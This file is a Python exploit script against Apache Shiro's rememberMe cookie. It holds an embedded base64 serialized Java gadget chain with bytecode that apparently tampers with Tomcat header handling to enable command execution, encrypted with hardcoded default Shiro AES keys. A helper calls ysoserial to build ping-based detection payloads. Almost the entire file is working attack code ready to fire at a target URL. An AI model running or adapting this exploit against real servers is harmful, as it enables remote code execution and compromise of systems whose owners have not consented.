import time
import base64
import uuid
import requests,re,subprocess
import binascii
from Crypto.Cipher import AES

header = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64)',
		'Connection':'close',
		'cmd':'whoami'
	}

def poc(url):
  try:
    payload = base64.b64decode('rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAEwLK/rq+AAAANADXCgAuAHIDAAGQAAkALQBzBwB0CAB1CgB2AHcHAHgIAHkHAHoIAHsHAHwIAH0HAH4IAH8KAHYAgAoAgQCCCgCDAIIKAIQAhQoAhACGBwCHCgAUAIgLAIkAigoAgQCLBwCMCgAYAI0KAI4AjwoAkACRCgCOAJIHAJMKAHYAlAoAdgCVCACWBwCXCACYCgCDAJkHAJoLACQAmwsAJACcBwCdCgAnAJ4KAJ8AoAoAgQChCgAdAKIHAKMHAKQHAKUBAApIZWFkZXJTaXplAQABSQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAt0ZW1wUmVxdWVzdAEAG0xvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0OwEAAWsBAAtnbG9iYWxGaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA9wcm9jZXNzb3JzRmllbGQBABByZXF1ZXN0R3JvdXBJbmZvAQAkTG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3RHcm91cEluZm87AQAEbGlzdAEAEExqYXZhL3V0aWwvTGlzdDsBAAFqAQAHY2xhc3NlcwEAEltMamF2YS9sYW5nL0NsYXNzOwEAD3Byb3RvY29sSGFuZGxlcgEAI0xvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXI7AQABaQEADGNvbnRleHRGaWVsZAEADHNlcnZpY2VGaWVsZAEADHJlcXVlc3RGaWVsZAEAD2hlYWRlclNpemVGaWVsZAEAEGdldEhhbmRsZXJNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAFXdlYmFwcENsYXNzTG9hZGVyQmFzZQEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2U7AQASYXBwbGljYXRpb25Db250ZXh0AQAtTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQ7AQAPc3RhbmRhcmRTZXJ2aWNlAQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZFNlcnZpY2U7AQAKY29ubmVjdG9ycwEAKltMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvQ29ubmVjdG9yOwEABHRoaXMBADBMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9Ub21jYXRIZWFkZXJUZW1wbGF0ZTsBAA1TdGFja01hcFRhYmxlBwCkBwCmBwCnBwCHBwB4BwCMBwBTBwCoBwBCBwCXBwCaBwCjAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAKkBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABlUb21jYXRIZWFkZXJUZW1wbGF0ZS5qYXZhDAAxADIMAC8AMAEAKG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQBAAdjb250ZXh0BwCqDACrAKwBACtvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0AQAHc2VydmljZQEAHW9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3RJbmZvAQADcmVxAQAqb3JnL2FwYWNoZS9jb3lvdGUvaHR0cDExL0h0dHAxMUlucHV0QnVmZmVyAQAQaGVhZGVyQnVmZmVyU2l6ZQEAIm9yZy9hcGFjaGUvY295b3RlL0Fic3RyYWN0UHJvdG9jb2wBAApnZXRIYW5kbGVyDACtAK4HAKYMAK8AsAcApwcAsQwAsgCzDAC0ALUBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UMALYAtwcAuAwAuQC6DAC7ALwBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRTZXJ2aWNlDAC9AL4HAL8MAMAAwQcAwgwAwwDEDADFAMYBAC9vcmcvYXBhY2hlL2NveW90ZS9odHRwMTEvQWJzdHJhY3RIdHRwMTFQcm90b2NvbAwAxwDIDADJAMEBAAZnbG9iYWwBACJvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0R3JvdXBJbmZvAQAKcHJvY2Vzc29ycwwAygDLAQAOamF2YS91dGlsL0xpc3QMAMwAxAwAuwDNAQAZb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdAwAzgDPBwDQDADRANIMANMA1AwA1QDWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEALmNvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvVG9tY2F0SGVhZGVyVGVtcGxhdGUBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBACFvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADGdldFJlc291cmNlcwEAJygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290OwEAI29yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290AQAKZ2V0Q29udGV4dAEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dDsBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmZpbmRDb25uZWN0b3JzAQAsKClbTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL0Nvbm5lY3RvcjsBACdvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3IBAAlnZXRTY2hlbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TdHJpbmcBAAZsZW5ndGgBAAMoKUkBABJnZXRQcm90b2NvbEhhbmRsZXIBACUoKUxvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXI7AQASZ2V0RGVjbGFyZWRDbGFzc2VzAQAUKClbTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAEc2l6ZQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldElucHV0QnVmZmVyAQAhKClMb3JnL2FwYWNoZS9jb3lvdGUvSW5wdXRCdWZmZXI7AQARamF2YS9sYW5nL0ludGVnZXIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAFHNldE1heEh0dHBIZWFkZXJTaXplAQAEKEkpVgAhAC0ALgAAAAEAAgAvADAAAAADAAEAMQAyAAEAMwAAA68ABAAUAAABciq3AAEqEgK1AAMSBBIFtgAGTBIHEgi2AAZNEgkSCrYABk4SCxIMtgAGOgQSDRIOAbYADzoFKwS2ABAZBAS2ABAsBLYAEC0EtgAQGQUEtgARuAAStgATwAAUOgYrGQa2ABW5ABYBALYAF8AABzoHLBkHtgAXwAAYOggZCLYAGToJAzYKFQoZCb6iAOUHGQkVCjK2ABq2ABugANAZCRUKMrYAHDoLGQvBAB2ZAL4SDbYAHjoMAzYNFQ0ZDL6iAKAQNBkMFQ0ytgAftgAbnwATEDwZDBUNMrYAH7YAG6AAehkMFQ0yEiC2AAY6DhIhEiK2AAY6DxkOBLYAEBkPBLYAEBkOGQUZCwG2ACO2ABfAACE6EBkPGRC2ABfAACQ6EQM2EhUSGRG5ACUBAKIALC0ZERUSuQAmAgC2ABfAACc6ExkEGRO2ACgqtAADuAAptgAqhBIBp//OhA0Bp/9eGQvAAB0qtAADtgArhAoBp/8ZpwAETLEAAQAKAW0BcAAsAAMANAAAAJ4AJwAAABEABAAPAAoAEwASABQAGgAVACIAFgArABcANQAYADoAGQBAABoARQAbAEoAHABQAB4AWwAfAG4AIAB5ACEAgAAiAIsAIwCaACQApAAlAKwAJgCzACcAvgAoAN4AKQDqACoA8wArAPkALAD/AC0BEQAuAR0ALwEsADABPgAxAU8ALwFVACcBWwA1AWcAIgFtADsBcAA5AXEAPAA1AAAAygAUAT4AEQA2ADcAEwEgADUAOAAwABIA6gBrADkAOgAOAPMAYgA7ADoADwERAEQAPAA9ABABHQA4AD4APwARALYApQBAADAADQCzALQAQQBCAAwApADDAEMARAALAIMA6gBFADAACgASAVsARgA6AAEAGgFTAEcAOgACACIBSwBIADoAAwArAUIASQA6AAQANQE4AEoASwAFAFsBEgBMAE0ABgBuAP8ATgBPAAcAeQD0AFAAUQAIAIAA7QBSAFMACQAAAXIAVABVAAAAVgAAAK8ACv8AgwALBwBXBwBYBwBYBwBYBwBYBwBZBwBaBwBbBwBcBwBdAQAA/gAyBwBeBwBfASf/AEEAEwcAVwcAWAcAWAcAWAcAWAcAWQcAWgcAWwcAXAcAXQEHAF4HAF8BBwBYBwBYBwBgBwBhAQAA/wA0AA4HAFcHAFgHAFgHAFgHAFgHAFkHAFoHAFsHAFwHAF0BBwBeBwBfAQAA+gAF+QAL/wAFAAEHAFcAAEIHAGIAAAEAYwBkAAIAMwAAAD8AAAADAAAAAbEAAAACADQAAAAGAAEAAABBADUAAAAgAAMAAAABAFQAVQAAAAAAAQBlAGYAAQAAAAEAZwBoAAIAaQAAAAQAAQBqAAEAYwBrAAIAMwAAAEkAAAAEAAAAAbEAAAACADQAAAAGAAEAAABGADUAAAAqAAQAAAABAFQAVQAAAAAAAQBlAGYAAQAAAAEAbABtAAIAAAABAG4AbwADAGkAAAAEAAEAagABAHAAAAACAHF1cQB+ABAAAAHpyv66vgAAADQAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACxMY29tL2ZlaWhvbmcvbGRhcC9nYWRnZXRzL3V0aWxzL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAKmNvbS9mZWlob25nL2xkYXAvZ2FkZ2V0cy91dGlscy9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAJmNvbS9mZWlob25nL2xkYXAvZ2FkZ2V0cy91dGlscy9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAOgAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==')
    
    key = 'fCq+/xW488hMTCD+cmJ3aQ=='
    #AES加密模板
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    
    file_body = pad(payload)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))

    requests.get(url, cookies={'rememberMe': base64_ciphertext.decode()}, headers=header,timeout=5, verify=False)
  except Exception as e:
    print(e)
  
def generator_from_jar(real_jar,command,real_key='kPH+bIxk5D2deZiIxcaaaA==',platform='linux'):
    if platform == 'linux':
        command = 'ping -c 2 {}'.format(command)
    elif platform == 'windows':
        command = 'ping {}'.format(command)
    command = "java -jar ysoserial.jar {} \"{}\"".format(real_jar,command)
    popen = subprocess.Popen(command, stdout=subprocess.PIPE ,shell=True,close_fds=True)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(real_key)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    out,drr = popen.communicate()
    file_body = pad(out)
    print(command)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def check(**kwargs):
    poc(kwargs['url'])

if __name__ == "__main__":
    url = ''
    poc(url)
    


































